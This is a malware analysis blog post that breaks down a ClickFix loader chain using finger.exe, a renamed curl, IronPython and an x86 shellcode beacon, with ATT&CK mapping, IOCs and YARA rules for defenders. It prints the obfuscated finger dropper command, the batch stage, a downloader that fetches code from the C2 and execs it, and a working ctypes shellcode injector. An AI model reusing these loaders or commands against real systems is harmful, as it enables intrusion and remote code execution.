---
title: "Seven layers of obfuscation, one 1970s LOLBIN: pulling apart a ClickFix chain through finger.exe"
date: 2026-05-24 09:30:00 +1000
categories: [Malware Analysis]
tags: [clickfix, lolbin, finger-exe, ironpython, shellcode, application-control, peb-walking, defense-evasion]
description: "A ClickFix loader using finger.exe over TCP/79 to drop IronPython and an in-process x86 shellcode beacon."
---

*The views and opinions expressed in this post are my own and do not represent those of my employer. This is a personal blog where I share research and things I'm learning.*

> **TL;DR**
>
> A likely ClickFix campaign is using `finger.exe` - yes, the 1970s remote-user-info protocol, yes, still on Windows 11 - as a malware dropper. The initial lure site wasn't captured in available telemetry, but the command line shape (pasted into an Explorer-parented `cmd.exe` with a visible "Verify... press ENTER" string) matches the ClickFix pattern. The chain runs: `cmd.exe` with `^`-obfuscated `finger` -> port 79 to `livnesticity[.]com` -> the finger server's "Plan" section is a batch script -> renamed `curl.exe` pulls IronPython from a real Microsoft GitHub release -> IronPython runs an inline Python downloader -> Cyrillic-lookalike-obfuscated shellcode injector -> in-process x86 shellcode beacons home to `noidoret[.]com`. Seven layers, zero PowerShell, zero AMSI surface, and a final shellcode that never spawns a new process.
>
> **If this is your fleet, do these first:**
>
> - Block `finger.exe` via Application Control and outbound TCP/79 at the firewall. Event ID **4688** for `finger.exe` execution is a near-zero-false-positive hunt.
> - Block user-writable paths from executing via Application Control - `%LocalAppData%\IronPython.*\net462\*.exe` is where this chain lands.
> - Hunt for the campaign UUID `6d6d2d17-d270-59c6-8b75-df011af08e58` across proxy, EDR, and SIEM logs - it appears in both the stage 2 download and the shellcode's hardcoded C2 path.
>
> Full IOCs and YARA rule are at the bottom.
{: .prompt-tip }

## When was the last time you wrote a detection for finger.exe?

An EDR alert came across my workflow yesterday with a name I haven't seen in years: "Finger.exe Execution". Parent process `cmd.exe`, grand-parent `Explorer.exe`, and the command line had `for /f "skip=27"` wrapped around a `finger` query against a domain I'd never heard of.

Read that twice. `finger.exe`. The 1970s protocol that exposes user info over TCP/79, the thing every Unix sysadmin disabled in the late 90s. It is **still** in Windows 11 - `C:\Windows\System32\finger.exe`, signed by Microsoft, never deprecated. Almost nobody monitors port 79 outbound. Almost nobody has an Application Control rule for `finger.exe`. Somebody noticed, and built a tour through Microsoft's own toolbox: `finger.exe`, `curl.exe`, `tar.exe`, and IronPython, all in sequence to land an in-process shellcode beacon. Let's go.

## The attack at a glance

1. **Initial access** - likely ClickFix social engineering. The initial lure site is not captured in available telemetry, but the command line shape (Explorer-parented `cmd.exe`, "Verify... press ENTER" lure text, pasted as a single line) matches the ClickFix pattern.
2. **Stage 1 (cmd.exe + finger)** - `^`-escaped `finger` reconstructed via `/v:on` delayed expansion; `for /f skip=27` reads the finger response and runs the "Plan" section as batch.
3. **Stage 2 (batch)** - Copy `curl.exe` to `%LocalAppData%\<random>.com`, download `IronPython.3.4.2.zip` from the real GitHub release URL (saved as `.pdf`), extract with `tar.exe`, rename `ipyw32.exe` to a random three-word filename.
4. **Stage 3 (IronPython)** - Run an inline `-c` payload that is `zlib.decompress(base64.b64decode(...)).decode('utf-32')` (note: UTF-32, not the usual UTF-16LE) to get a Python downloader.
5. **Stage 4 (Python downloader)** - SSL verification disabled, pull stage 5 from `noidoret[.]com/<uuid>/version1`, `exec()` it in-process.
6. **Stage 5 (Cyrillic-obfuscated shellcode injector)** - Base64 string with seven ASCII chars replaced by Cyrillic lookalikes; after `.replace()` chain and decode, a `ctypes` shellcode injector XOR-decrypts an 8,912-byte payload, allocates executable heap, calls it.
7. **Stage 6 (x86 shellcode)** - PEB-walk to resolve `kernel32.dll`, build C2 URL char-by-char on the stack, HTTPS beacon to `noidoret[.]com/<uuid>/callback1AB`.

That's the whole chain. No PowerShell anywhere. No `.ps1` file lands on disk. No AMSI surface. The shellcode runs inside the IronPython interpreter's address space - no new process is spawned to alert on.

## How it works

### Stage 1 - finger.exe, in 2026

The pasted `cmd.exe` line is:

```text
"C:\Windows\System32\cmd.exe" /c start "" /min for /f "skip=27 delims=" %y in
  ('C:\WINDOWS\system32\cmd.exe /v:on /c
   "set FBHRDVEBUk=f^i^n^g^e^r&!FBHRDVEBUk! kBjvkbPVSq@livnesticity[.]com"')
  do %y &                ---Verify ----------------press ENTER---
```

A few tricks in one line. `start "" /min` spawns the inner shell minimised so the user's eyes never land on it. `set FBHRDVEBUk=f^i^n^g^e^r` plus `/v:on` delayed expansion means the literal string `finger` never appears on the command line - any `4688` rule that grep's for `finger` misses the outer shell. The trailing `---Verify ---press ENTER---` is the visible lure text from the CAPTCHA page, left in for completeness.

`for /f "skip=27 delims=" %y in ('finger user@host') do %y` reads every line of the finger response, drops the first 27 (the protocol header), and executes each remaining line as a `cmd.exe` command. The "Plan" section - the bit that traditionally held a user's `~/.plan` file - becomes an arbitrary attacker-controlled batch script.

Why this works: outbound TCP/79 is almost universally unmonitored. Web proxies don't see it, DLP doesn't see it. Most EDRs log the `finger.exe` execution but few sites have a rule that fires on it. The protocol is so obscure that the muscle-memory detection rules don't exist.

### Stage 2 - LOLBIN tour

The Plan section served by `livnesticity[.]com` is a batch script that:

```text
:: copy curl, masquerade as .com
copy C:\Windows\System32\curl.exe %LocalAppData%\<4-random-words>.com

:: stage download dir
mkdir %LocalAppData%\IronPython.3.4.2

:: disrupt user visibility and any Explorer-hooked tools
taskkill /f /fi "IMAGENAME eq explor*"

:: pull IronPython release zip from real GitHub, save as .pdf
<random>.com -L -o %LocalAppData%\IronPython.3.4.2.pdf ^
  https://github.com/IronLanguages/ironpython3/releases/download/v3.4.2/IronPython.3.4.2.zip

:: extract using another LOLBIN
tar -xf %LocalAppData%\IronPython.3.4.2.pdf -C %LocalAppData%\IronPython.3.4.2

:: rename the interpreter to something innocuous
ren %LocalAppData%\IronPython.3.4.2\net462\ipyw32.exe <three-words>.exe

:: run IronPython with an inline -c payload
%LocalAppData%\IronPython.3.4.2\net462\<three-words>.exe -c "<base64+zlib stage 3>"

:: restart Explorer to mask the disruption
start explorer.exe
```

The `curl.exe` rename gives a Microsoft-signed binary a `.com` extension and a random filename, so allow-lists keyed on filename miss it. The `.pdf` extension on the archive sidesteps content-type filtering. And then **IronPython** as the script host - the open-source .NET implementation of Python 3, a real Microsoft-backed project downloaded from a legitimate GitHub release (signed CDN, no reputation risk). Once it runs, it has no Script Block Logging equivalent, no AMSI integration, and most EDR rules around "interpreter abuse" are pointed at PowerShell, CPython, or `wscript.exe`. `ipyw32.exe` out of `%LocalAppData%` doesn't ring the same bells.

The `taskkill /f /fi "IMAGENAME eq explor*"` line is the most interesting throwaway tradecraft choice. Killing Explorer takes down the taskbar, any open Explorer windows, and disrupts shell-extension-based security tooling. The script restarts Explorer immediately after, so the user sees a brief flicker and maybe writes it off as "Windows being Windows".

### Stage 3 - IronPython inline payload

The `-c` argument is a one-liner of the shape:

```python
import base64, zlib
exec(zlib.decompress(base64.b64decode('eJydk91KA0EMhb...')).decode('utf-32'))
```

The `utf-32` choice (instead of the more common `utf-16-le` you'd see in PowerShell `-EncodedCommand`) is small - not adding security, just slightly off the well-trodden path of decoder scripts. After decode, what runs in-process is:

```python
#sNMat9
import ssl, time, urllib.request
ssl._create_default_https_context = ssl._create_unverified_context  # no cert checks
c = urllib.request.urlopen(
    'hxxps://noidoret[.]com/6d6d2d17-d270-59c6-8b75-df011af08e58/version1'
).read().decode('utf-8')
time.sleep(2.1)   # small anti-sandbox delay
exec(c)
```

Cert validation off so the C2 can use a self-signed or untrusted cert. A 2.1-second sleep that does nothing for production users but trips up most sandboxes that timeout aggressively. Then `exec()` of whatever the server returns. The `#sNMat9` comment at the top is a campaign / build marker - hunting for that exact string in EDR memory captures or process command lines is a cheap, high-fidelity pivot.

### Stage 4 - Cyrillic-lookalike injector

What the C2 returns is, on first inspection, a Python file that fails to base64-decode. Look closer at the encoded string and you'll see characters that look like ASCII but aren't:

```python
# Cyrillic 'М' (U+041C) looks like ASCII 'M' but base64.b64decode hates it
encoded = "<base64-like string with М, х, Н, В, У, е, Ц mixed in>"
b64 = (encoded.replace('М','p').replace('х','a').replace('Н','9')
              .replace('В','n').replace('У','r').replace('е','b').replace('Ц','h'))
python_code = base64.b64decode(b64).decode('utf-8')
exec(python_code)
```

Seven Cyrillic code-points substituted for seven ASCII characters, each on a one-to-one map. The string entropy looks lower than expected because Cyrillic chars are two bytes in UTF-8 interspersed with one-byte ASCII; the resulting file ratio confuses some packers and string extractors. Once the `.replace()` chain runs you have a normal base64 string and a normal Python file.

What the file does is a textbook in-process shellcode loader:

```python
import ctypes, time, base64

def xor_decrypt(ct, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))

shellcode = bytearray(xor_decrypt(
    base64.b64decode('<8912-byte XOR-encrypted shellcode>'),
    base64.b64decode('pUSq6TDChC0+EpkRypIRA1vLGXGUNw==')))  # 22-byte XOR key

heap = ctypes.windll.kernel32.HeapCreate(0x00040000, len(shellcode), 0)  # HEAP_CREATE_ENABLE_EXECUTE
ptr  = ctypes.windll.kernel32.HeapAlloc(heap, 0x8, len(shellcode))       # HEAP_ZERO_MEMORY
buf  = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

time.sleep(3)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
time.sleep(4)
ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)()
```

`HeapCreate(0x00040000, ...)` creates an executable heap (`HEAP_CREATE_ENABLE_EXECUTE`), `HeapAlloc(..., 0x8, ...)` allocates a zeroed region inside it, `RtlMoveMemory` copies the decrypted shellcode in, and `CFUNCTYPE(ptr)()` casts the heap pointer to a function and calls it. Two `time.sleep()` calls (3 and 4 seconds) buy time against sandbox timeouts. The XOR key is 22 bytes long - longer than the usual 8-or-16 - which slightly reduces the repeating-byte pattern that simple cryptanalysis-by-eye would catch.

This whole stage runs inside the IronPython interpreter's process. No new process is spawned. No file is written to disk. The shellcode lives in memory only.

### Stage 5 - x86 shellcode, stack-string C2

The decrypted shellcode is 8,912 bytes, starts with the standard x86 prologue (`55 8B EC 81 EC DC 00 00 00`), and does two things that are worth calling out:

**PEB walking** - the shellcode never references `kernel32.dll` by name. Instead:

```text
mov  eax, fs:[0x30]    ; PEB
mov  eax, [eax+0x0C]   ; PEB.Ldr (PEB_LDR_DATA)
mov  eax, [eax+0x14]   ; InMemoryOrderModuleList
; walk list, compare hashed module names against target hash, etc.
```

`fs:[0x30]` on x86 is the per-thread pointer to the Process Environment Block, and from there you can iterate the loaded module list to find `kernel32.dll`, then walk its export table to resolve `LoadLibraryA`, `WinHttpOpen`, etc. by hash. Net result: no Import Address Table to inspect, no `kernel32` string in the binary, and import-hash detection signatures (imphash) get nothing.

**Stack-string C2 URL** - the URL never appears as a contiguous string. Instead the shellcode builds it character-by-character:

```text
mov  ebx, 0x68           ; 'h'
mov  word ptr [ebp-0x40], bx
mov  ebx, 0x74           ; 't'
mov  word ptr [ebp-0x3E], bx
...
```

Each character lands on the stack via an individual `mov` instruction. The literal string never exists in the binary's data section - a `strings` pass returns nothing. You can reconstruct it only by disassembling and tracing the writes (or by running it in a controlled environment and looking at the stack after the prologue). After tracing, the URL is:

```text
hxxps://noidoret[.]com/6d6d2d17-d270-59c6-8b75-df011af08e58/callback1AB
```

The campaign UUID `6d6d2d17-d270-59c6-8b75-df011af08e58` appears in both the stage 4 download URL (`/<uuid>/version1`) and the shellcode's hardcoded callback path (`/<uuid>/callback1AB`). That UUID is a high-fidelity cross-stage clustering signal - any host's proxy logs that show a GET to that UUID is almost certainly involved.

## Techniques observed (MITRE ATT&CK)

The following techniques have been mapped to MITRE ATT&CK for future reference.

| Tactic | Technique | ATT&CK ID | What it did here |
|--------|-----------|-----------|------------------|
| Initial Access | User Execution: Malicious Copy/Paste | T1204.004 | Pasted `cmd.exe` one-liner; command line shape consistent with ClickFix, though the initial lure site is not captured. |
| Execution | Windows Command Shell | T1059.003 | `cmd.exe` with `^`-escape obfuscation and `/v:on` delayed expansion. |
| Execution | System Binary Proxy Execution (finger, tar) | T1218 | `finger.exe` as the dropper channel; `tar.exe` extracted the archive. |
| Command & Control | Ingress Tool Transfer | T1105 | `finger.exe` over TCP/79; later `curl.exe` over HTTPS to GitHub. |
| Defense Evasion | Masquerading: Rename System Utilities | T1036.003 | `curl.exe` copied to `%LocalAppData%\<random>.com`. |
| Defense Evasion | Masquerade File Type | T1036.008 | `IronPython.3.4.2.zip` saved as `.pdf`. |
| Defense Evasion | Encoded Data: Cyrillic substitution | T1027.013 | Seven Cyrillic code-points replaced ASCII chars in the stage 4 base64. |
| Defense Evasion | Command Obfuscation | T1027.010 | `zlib + base64` of `utf-32` for stage 3; XOR with 22-byte key for stage 5. |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | `taskkill /f` on `explorer.exe`. |
| Defense Evasion | Subvert Trust Controls | T1553 | `ssl._create_default_https_context = _create_unverified_context`. |
| Defense Evasion | Virtualization/Sandbox Evasion: Time Based | T1497.003 | 2.1s + 3s + 4s sleep delays. |
| Defense Evasion | Reflective Code Loading / Native API | T1620 / T1106 | `HeapCreate(HEAP_CREATE_ENABLE_EXECUTE)` + `RtlMoveMemory` + `CFUNCTYPE` call. |
| Defense Evasion | Obfuscated Files: Software Packing (stack strings, PEB walk) | T1027.002 | C2 URL built char-by-char on the stack; APIs resolved via PEB. |
| Command & Control | Application Layer Protocol: Web | T1071.001 | HTTPS beacon to `noidoret[.]com`. |

## Why this matters

The architecture is "use Microsoft's own tools against you, end-to-end". `finger.exe`, `curl.exe`, `tar.exe` - all Microsoft-signed in System32. IronPython - Microsoft-backed open-source, from a legitimate GitHub release. No exploit, no vulnerability, no patch that fixes any of this. The only "malicious" thing on the box is the shellcode in memory, and that lives inside a legitimately-running interpreter process - not in any binary an EDR can scan.

What the attacker gets is a live HTTPS beacon with stage-on-demand capability. The architecture (PEB walking, stack-string C2, heap execution) is consistent with Cobalt Strike or Havoc stagers, but the family can't be confirmed from static analysis alone. Whatever the operator pushes through the beacon runs in-process under whatever account ran IronPython.

The user is the entry vector. No attachment to mark-of-the-web, no exploit to patch. You can't patch a copy-paste. What you can do is take the LOLBINs off the table.

## What defenders can do

| Technique (ATT&CK) | What to do | Essential Eight | What to hunt for |
|--------------------|------------|-----------------|------------------|
| Likely ClickFix copy-paste (T1204.004) | Browser-side: enable Smart App Control / SmartScreen; deploy a browser extension that warns on cross-origin clipboard writes; user training that the Run dialog is the new attachment. | User Application Hardening; Application Control | EID **4688** for `cmd.exe` parented to a browser process (`chrome.exe`, `msedge.exe`, `firefox.exe`) with command lines containing `finger`, `curl`, `mshta`, `bitsadmin`, or `for /f`. |
| finger.exe LOLBIN (T1218 + T1105) | Block `finger.exe` outright via Application Control - it has no legitimate enterprise use case I have ever seen. Block outbound TCP/79 at the perimeter. | Application Control (L1+) | EID **4688** for `finger.exe` execution; firewall logs for outbound TCP/79; proxy logs (if your proxy sees non-HTTP/HTTPS) for finger queries. |
| cmd.exe `^`-escape + delayed expansion (T1059.003) | Application Control on `cmd.exe` parent contexts where a browser is the grandparent. Standard PowerShell CLM / WDAC rules don't help here because nothing is PowerShell - this is cmd. | Application Control; User Application Hardening | EID **4688** for `cmd.exe` with literal `^` chars in the command line and `/v:on` from non-admin contexts; chains of `cmd.exe -> cmd.exe -> finger.exe` / `curl.exe`. |
| Renamed curl as `.com` (T1036.003), zip as `.pdf` (T1036.008) | Application Control validates the actual payload regardless of filename; tighten ACLs on `%LocalAppData%` so only signed installers can write executables there if you can. | No direct E8 home (Masquerading); Application Control still bites at execution. | File-creation auditing on `%LocalAppData%` for `.com` files and unexpected `.pdf` files. EID **4688** for processes whose image path ends in `.com` running with curl-style argv. |
| IronPython interpreter abuse (T1218 + T1059) | Application Control rule: deny `ipy.exe`, `ipyw.exe`, `ipy32.exe`, `ipyw32.exe`, `ipy64.exe`, `ipyw64.exe` from `%LocalAppData%`, `%TEMP%`, `%APPDATA%`, and any user-writable path. If IronPython is needed, scope to a specific known install path. | Application Control (L1+); User Application Hardening | File-creation auditing on `%LocalAppData%\IronPython.*\`. EID **4688** for any IronPython interpreter binary regardless of name (hash-based App Control rules survive the rename). |
| Kill Explorer (T1562.001) | Detection only - there's no clean preventative control for a user `taskkill`ing their own Explorer. EDR / Sysmon should alarm on `explorer.exe` exit followed by a fast restart. | No direct E8 home; monitoring maturity. | EID **4688** for `taskkill /f /fi "IMAGENAME eq explor*"` - the wildcard match shape is almost only seen from malicious tooling. Sysmon Event ID **5** for `explorer.exe` process termination. |
| SSL verification disabled (T1553) | No direct E8 home - this is application code disabling its own cert checks. Network: prefer breaking-and-inspecting (or at least logging) HTTPS where possible so unverified certs leave a trace. | No direct E8 home. | TLS inspection / proxy logs for connections that present self-signed or recently-issued certs, especially from script interpreter processes. |
| In-process shellcode (T1620 / T1106) | Application Control on the host process (the IronPython interpreter) is the chokepoint. Once code runs inside an allowed interpreter, in-process injection is hard to prevent at OS level - so don't let the interpreter run in the first place. | Application Control. | EDR memory protection / behavioural detection for `HeapCreate` with `HEAP_CREATE_ENABLE_EXECUTE` followed by `RtlMoveMemory` in script-interpreter processes. |
| HTTPS C2 (T1071.001) | Default-deny egress; proxy with reputation and category enforcement; DNS filtering on newly-registered domains; treat low-volume HTTPS from user workstations to never-before-seen domains as the loud anomaly it is. | No direct E8 home; network architecture. | Proxy logs for `noidoret[.]com`, `livnesticity[.]com`, and any host fetching the campaign UUID `6d6d2d17-d270-59c6-8b75-df011af08e58`. |

### Block finger.exe. Today.

The single highest-value control here is **Application Control on `finger.exe`**. Almost no production environment uses it; a WDAC or AppLocker deny rule blows the chain up at stage zero. **Essential Eight: Application Control.** *Implementing Application Control* (November 2023) covers the rule shapes - this is exactly the kind of "rare LOLBIN" entry that belongs on a Microsoft-recommended block list rollout.

### Take user-writable interpreters off the table

The chain lands an entire IronPython runtime under `%LocalAppData%`. Application Control rules that deny execution from user-writable paths break this whole class of chain - not just IronPython, but every renamed-interpreter trick. **Essential Eight: Application Control (Maturity Level 1+); User Application Hardening.** *Hardening Microsoft Windows 11 Workstations* (September 2025) has the rollout settings.

### Treat outbound TCP/79 as a near-zero-false-positive alarm

Any outbound TCP/79 from a workstation is almost certainly worth investigating. Block at the firewall by default, alert on any attempt. **No direct Essential Eight home** - it's network architecture and egress filtering - but the cost is roughly zero and the signal is strong.

### Pivot on the campaign UUID

The same UUID (`6d6d2d17-d270-59c6-8b75-df011af08e58`) appears in the stage 2 download URL and the shellcode's hardcoded callback path. One grep across proxy / EDR / SIEM logs for it will tell you whether any other host has been touched - cheap, high-fidelity, worth doing even if you don't think this is in your fleet.

## Hunting and detection summary

- **EID 4688** for `finger.exe` execution. This should fire approximately never in a healthy environment.
- **EID 4688** for `cmd.exe` parented by a browser process (`chrome.exe`, `msedge.exe`, `firefox.exe`) with command lines containing `for /f`, `finger`, `curl`, or `bitsadmin`.
- **EID 4688** for command lines containing literal `^` escape characters and `/v:on` together, especially from interactive `cmd.exe` chains.
- **EID 4688** for any IronPython interpreter image (`ipyw32.exe`, `ipyw.exe`, `ipy.exe`, `ipy32.exe`, `ipy64.exe`, `ipyw64.exe`) regardless of filename - match on the binary hash, the renamed copies preserve it.
- **EID 4688** for `taskkill /f /fi "IMAGENAME eq explor*"` - the wildcard syntax is unusual and almost always malicious.
- **Sysmon Event ID 5** for `explorer.exe` exit followed by a `Sysmon Event ID 1` restart within seconds, from a non-system parent.
- **File-creation auditing** on `%LocalAppData%\IronPython.*\` and on `%LocalAppData%\*.com` files (renamed curl copies).
- **Firewall logs** for outbound TCP/79 from workstation subnets.
- **Proxy logs** for `noidoret[.]com`, `livnesticity[.]com`, and the campaign UUID `6d6d2d17-d270-59c6-8b75-df011af08e58` in any path.
- **Memory** of script-interpreter processes for the build marker `#sNMat9`.

## Indicators of Compromise

| Type | Indicator | Notes |
|------|-----------|-------|
| SHA-256 | `e3c3ed636a1cc640fbf29a561a43bbbc43a2aad1468ce8f57ee7737e7c226ab3` | Stage 1 batch script (finger Plan section). |
| SHA-256 | `67f4eb14aca5aa26836ab6dcb8a81ab70c24fafbca98f83eb2afb4e6b5042b9f` | Stage 3 IronPython downloader (post zlib + utf-32 decode). |
| SHA-256 | `62410859cf8b160cd0cb57ec972e8e77ec6d379fa1fd5b69f7d75d54d10ab5e4` | Stage 4 Cyrillic-obfuscated shellcode injector. |
| SHA-256 | `b10b14c401bb553a8c49c0a4c8bcb9e3a01c347397e666a5b683394d26ad4df2` | Decrypted x86 shellcode (post XOR). |
| Domain | `livnesticity[.]com` | Finger server (TCP/79) - serves the stage 1 batch payload in the finger Plan section. **Not** confirmed as the ClickFix lure source. Block apex + subdomains. |
| Domain | `noidoret[.]com` | C2 server - stage 4 download and shellcode beacon. Block apex + subdomains. |
| URL | `hxxps://noidoret[.]com/6d6d2d17-d270-59c6-8b75-df011af08e58/version1` | Stage 4 download. |
| URL | `hxxps://noidoret[.]com/6d6d2d17-d270-59c6-8b75-df011af08e58/callback1AB` | Shellcode beacon check-in (reconstructed from stack-string disassembly). |
| Campaign UUID | `6d6d2d17-d270-59c6-8b75-df011af08e58` | Cross-stage clustering. Hunt across all logs. |
| Build marker | `#sNMat9` | Comment at top of stage 3 IronPython payload. Hunt in memory of script-interpreter processes. |
| XOR key (hex, 22 bytes) | `a544aae930c2842d3e129911ca9211035bcb19719437` | Stage 5 shellcode decryption key. Same key + new sample = same build. |
| Filename pattern | `%LocalAppData%\IronPython.3.4.2\` | Drop directory. |
| Filename pattern | `%LocalAppData%\IronPython.3.4.2.pdf` | IronPython zip saved with `.pdf` extension. |
| Filename pattern | `%LocalAppData%\<4-random-words>.com` | Renamed copy of `curl.exe`. |
| Filename pattern | `%LocalAppData%\IronPython.3.4.2\net462\<3-words>.exe` | Renamed `ipyw32.exe` interpreter. |
| Process pattern | `Explorer.EXE -> cmd.exe -> finger.exe` | Initial chain in EDR process tree. |
| Lure string | `---Verify ----------------press ENTER---` | Visible in cmd.exe command line; consistent with a ClickFix-style lure overlay (source page not captured). |

## Detection rules

```yara
rule ClickFix_Finger_IronPython_Loader
{
    meta:
        author      = "Luke Wilkinson"
        date        = "2026-05-24"
        description = "ClickFix campaign: finger.exe LOLBIN + IronPython interpreter abuse delivering an in-process x86 shellcode beacon. C2 at noidoret[.]com."
        sha256_s2   = "67f4eb14aca5aa26836ab6dcb8a81ab70c24fafbca98f83eb2afb4e6b5042b9f"
        sha256_s3   = "62410859cf8b160cd0cb57ec972e8e77ec6d379fa1fd5b69f7d75d54d10ab5e4"
        severity    = "high"

    strings:
        // Campaign UUID across all stages
        $uuid          = "6d6d2d17-d270-59c6-8b75-df011af08e58" ascii

        // Stage 3 build marker
        $marker        = "#sNMat9" ascii

        // C2 + finger delivery domains (fanged so the rule matches real content)
        $c2            = "noidoret.com" ascii
        $finger_apex   = "livnesticity.com" ascii

        // Stage 4 Cyrillic substitution fingerprint (one pair shown)
        $cyrillic_pair = ".replace('\xd0\x9c', 'p').replace('\xd1\x85', 'a')" ascii

        // ctypes heap exec pattern
        $heap_exec     = "HeapCreate(0x00040000" ascii
        $rtl_move      = "RtlMoveMemory" ascii

        // IronPython drop directory artifact
        $ironpy_dir    = "IronPython.3.4.2" ascii

        // ClickFix lure text from cmd.exe command line
        $lure          = "---Verify ----------------press ENTER---" ascii

    condition:
        any of ($uuid, $marker, $finger_apex, $lure)
        or ($c2 and ($cyrillic_pair or $heap_exec or $ironpy_dir))
        or all of ($rtl_move, $heap_exec)
}

rule Shellcode_HTTPS_Beacon_StackString_PEB
{
    meta:
        author      = "Luke Wilkinson"
        date        = "2026-05-24"
        description = "x86 shellcode that resolves kernel32 via PEB walk and builds C2 URL on the stack via single-char word-sized writes. Associated with the finger.exe / IronPython campaign."
        sha256      = "b10b14c401bb553a8c49c0a4c8bcb9e3a01c347397e666a5b683394d26ad4df2"
        severity    = "high"

    strings:
        // PEB walk on x86: mov eax, fs:[0x30]
        $peb_walk = { 64 A1 30 00 00 00 }

        // Stack-string pattern for 'h' in "https" (mov reg, 0x68; mov word [ebp+x], reg)
        $https_h  = { B? 68 00 00 00 66 89 }

        // 22-byte XOR key from this campaign
        $xor_key  = { A5 44 AA E9 30 C2 84 2D 3E 12 99 11 CA 92 11 03 5B CB 19 71 94 37 }

    condition:
        uint16(0) == 0x8B55 and $peb_walk and ($https_h or $xor_key)
}
```

## Closing

The LOLBIN surface on Windows is wider and older than most detection content acknowledges. We have rules for `mshta`, `powershell -enc`, `rundll32` with funny arguments. We mostly don't have rules for `finger.exe`, `ipyw32.exe`, or `taskkill /f /fi "IMAGENAME eq explor*"`. None of those are exotic - just the part of the tree that hasn't had a popular blog post yet.

The bright side: exactly *because* they're unused, the detections are cheap. `finger.exe` execution, outbound TCP/79, anything from `%LocalAppData%\IronPython.*\` - all near-zero-false-positive alarms. If you have an hour this week, add those three rules. The next ClickFix campaign through your fleet will have a much harder time getting past stage one.

Stay curious.

---

*This post leans on AI more than usual. The signal and the file are mine - I pulled the sample into my workflow and decided it was worth writing up - but the heavy lifting on the static reverse engineering was done by Claude (Anthropic): the stage-by-stage decoding, the Cyrillic-substitution unmasking, the shellcode XOR + PEB walk + stack-string reconstruction, and the YARA rules. I directed the investigation, reviewed the findings, and edited the prose. Errors are still mine. If you spot something off, ping me on [X](https://twitter.com/btcoolteam) or [Instagram](https://instagram.com/blueteamcoolteam).*

## References

- MITRE ATT&CK: [T1204.004](https://attack.mitre.org/techniques/T1204/004/), [T1218](https://attack.mitre.org/techniques/T1218/), [T1059.003](https://attack.mitre.org/techniques/T1059/003/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1036.003](https://attack.mitre.org/techniques/T1036/003/), [T1036.008](https://attack.mitre.org/techniques/T1036/008/), [T1027.013](https://attack.mitre.org/techniques/T1027/013/), [T1027.010](https://attack.mitre.org/techniques/T1027/010/), [T1027.002](https://attack.mitre.org/techniques/T1027/002/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/), [T1553](https://attack.mitre.org/techniques/T1553/), [T1497.003](https://attack.mitre.org/techniques/T1497/003/), [T1620](https://attack.mitre.org/techniques/T1620/), [T1106](https://attack.mitre.org/techniques/T1106/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/)
- ASD/ACSC: *Implementing Application Control* (November 2023), *Hardening Microsoft Windows 11 Workstations* (September 2025), *Essential Eight Maturity Model* (November 2023)
- LOLBAS Project: `finger.exe`, `curl.exe`, `tar.exe`
